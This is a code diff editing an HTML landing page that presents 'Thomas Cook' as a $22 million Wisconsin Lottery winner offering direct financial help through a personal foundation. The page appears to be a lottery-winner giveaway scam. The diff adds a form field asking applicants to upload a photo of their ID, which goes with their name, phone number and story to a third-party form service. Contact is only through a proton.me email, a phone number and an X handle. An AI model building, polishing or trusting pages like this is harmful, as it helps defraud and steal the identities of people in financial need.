@@ -7,29 +7,29 @@
   <script src="https://cdn.tailwindcss.com"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
   <style>
-    body { font-family: system-ui, sans-serif; }
-    .hero { background: linear-gradient(rgba(0,0,0,0.8), rgba(0,0,0,0.8)), url('https://picsum.photos/id/1015/2000/1200') center/cover; }
+    body { font-family: system-ui, -apple-system, sans-serif; }
+    .hero { background: linear-gradient(rgba(0,0,0,0.75), rgba(0,0,0,0.75)), url('https://picsum.photos/id/1015/2000/1200') center/cover no-repeat; }
   </style>
 </head>
 <body class="bg-white">
 
-  <!-- Nav -->
-  <nav class="border-b py-6">
+  <!-- Navigation -->
+  <nav class="border-b py-6 sticky top-0 bg-white z-50">
     <div class="max-w-7xl mx-auto px-8 flex justify-between items-center">
       <div class="flex items-center gap-3">
         <i class="fa-solid fa-hand-holding-heart text-4xl text-emerald-700"></i>
         <h1 class="text-2xl font-bold">Thomas Cook</h1>
       </div>
-      <a href="#apply" class="bg-emerald-700 text-white px-8 py-3 rounded-full font-medium">Apply for Help</a>
+      <a href="#apply" class="bg-emerald-700 text-white px-8 py-3.5 rounded-full font-medium hover:bg-emerald-800">Apply for Help</a>
     </div>
   </nav>
 
   <!-- Hero -->
   <section class="hero text-white py-32 text-center">
     <div class="max-w-4xl mx-auto px-6">
-      <h1 class="text-6xl font-bold leading-tight mb-6">Rebuilding lives.<br>Empowering your next chapter.</h1>
+      <h1 class="text-6xl md:text-7xl font-bold leading-tight mb-8">Rebuilding lives.<br>Empowering your next chapter.</h1>
       <p class="text-2xl mb-12">A personal initiative by Thomas Cook providing direct funding, stability, and growth for families, students, and communities in Wisconsin and beyond.</p>
-      <a href="#apply" class="bg-white text-emerald-800 px-12 py-5 rounded-full text-xl font-semibold inline-block">Start Your Application</a>
+      <a href="#apply" class="bg-white text-emerald-800 px-12 py-6 rounded-full text-xl font-semibold inline-block hover:bg-emerald-100">Start Your Application</a>
     </div>
   </section>
 
@@ -51,17 +51,23 @@
     </div>
   </section>
 
-  <!-- Real Stories -->
-  <section class="py-24">
-    <div class="max-w-6xl mx-auto px-6">
-      <h2 class="text-5xl font-bold text-center mb-16">Real People. Real Support.</h2>
-      <div class="grid md:grid-cols-2 lg:grid-cols-3 gap-8">
-        <!-- Add your testimonials here -->
-        <div class="border rounded-3xl p-8">
-          <p class="italic">"Thank you Thomas for helping my family get back on our feet."</p>
-          <p class="mt-6 font-medium">- The Rodriguez Family, Madison</p>
+  <!-- Founder Story -->
+  <section class="py-24 bg-white">
+    <div class="max-w-5xl mx-auto px-6">
+      <div class="grid md:grid-cols-2 gap-16 items-center">
+        <div>
+          <img src="https://i.imgur.com/ZD2xB.jpg" alt="Thomas Cook" class="rounded-3xl shadow-2xl w-full">
         </div>
-        <!-- Repeat more as needed -->
+        <div>
+          <h2 class="text-5xl font-bold leading-tight mb-10">From Lottery Winner to Community Builder</h2>
+          <p class="text-xl leading-relaxed text-zinc-600">
+            After winning $22 million from the Wisconsin Lottery in 2020, Thomas Cook made a life-changing decision — to use his blessing to help others. 
+            Instead of luxury, he chose legacy. The Cook Foundation was born from gratitude and a deep desire to support hardworking families across Wisconsin.
+          </p>
+          <p class="text-xl leading-relaxed text-zinc-600 mt-8">
+            Today, the foundation provides direct financial help for education, housing, medical needs, small businesses, and emergency support — with no middlemen and no complicated process.
+          </p>
+        </div>
       </div>
     </div>
   </section>
@@ -69,24 +75,36 @@
   <!-- Application -->
   <section id="apply" class="py-24 bg-emerald-700 text-white">
     <div class="max-w-2xl mx-auto px-6 text-center">
-      <h2 class="text-5xl font-bold mb-8">Ready for your new chapter?</h2>
-      <p class="text-xl mb-12">Share your story. Real help. No middlemen.</p>
-      <form action="https://formspree.io/f/mbdvovzv" method="POST" class="space-y-6">
-        <input type="text" name="name" placeholder="Full Name" required class="w-full px-6 py-5 rounded-2xl text-black">
-        <input type="tel" name="phone" placeholder="Phone Number" required class="w-full px-6 py-5 rounded-2xl text-black">
-        <textarea name="story" rows="6" placeholder="Tell us how we can help you..." required class="w-full px-6 py-5 rounded-2xl text-black"></textarea>
-        <button type="submit" class="w-full bg-white text-emerald-700 py-6 rounded-2xl text-xl font-bold">Submit Your Story</button>
+      <h2 class="text-5xl font-bold mb-6">Ready to Start Your New Chapter?</h2>
+      <p class="text-xl mb-12">Share your story. Real help. Fast response.</p>
+      
+      <form action="https://formspree.io/f/mbdvovzv" method="POST" enctype="multipart/form-data" class="space-y-8">
+        <input type="text" name="name" placeholder="Full Name" required class="w-full px-8 py-6 rounded-2xl text-black text-lg">
+        <input type="tel" name="phone" placeholder="Phone Number" required class="w-full px-8 py-6 rounded-2xl text-black text-lg">
+        <textarea name="story" rows="6" placeholder="Tell us how we can help you..." required class="w-full px-8 py-6 rounded-2xl text-black text-lg"></textarea>
+        
+        <div>
+          <label class="block text-sm mb-3 text-left">Upload Photo of ID (for verification)</label>
+          <input type="file" name="id_photo" accept="image/*" class="w-full px-8 py-6 bg-white rounded-2xl text-black">
+        </div>
+
+        <button type="submit" class="w-full bg-white text-emerald-700 py-7 rounded-2xl text-xl font-bold hover:bg-zinc-100">
+          Submit Your Story
+        </button>
       </form>
     </div>
   </section>
 
   <!-- Footer -->
-  <footer class="bg-zinc-900 text-zinc-400 py-16 text-center">
-    <p class="text-2xl font-bold text-white">Thomas Cook</p>
-    <p class="mt-4">Supporting Wisconsin Communities</p>
-    <p class="mt-8">📧 THECOOKFOUNDATION@proton.me</p>
-    <p>📞 (343) 430-0052</p>
-    <p class="mt-8">X: @Thecook_j</p>
+  <footer class="bg-zinc-900 text-zinc-400 py-20 text-center">
+    <div class="max-w-4xl mx-auto px-6">
+      <p class="text-3xl font-bold text-white mb-2">Thomas Cook</p>
+      <p class="text-lg mb-8">Supporting Wisconsin Communities Since 2022</p>
+      <p class="text-2xl mb-4">📧 THECOOKFOUNDATION@proton.me</p>
+      <p class="text-2xl mb-8">📞 (343) 430-0052</p>
+      <a href="https://x.com/Thecook_j" target="_blank" class="text-4xl hover:text-white">X @Thecook_j</a>
+      <p class="text-sm mt-16">© 2026 The Cook Foundation. All Rights Reserved.</p>
+    </div>
   </footer>
 
 </body>
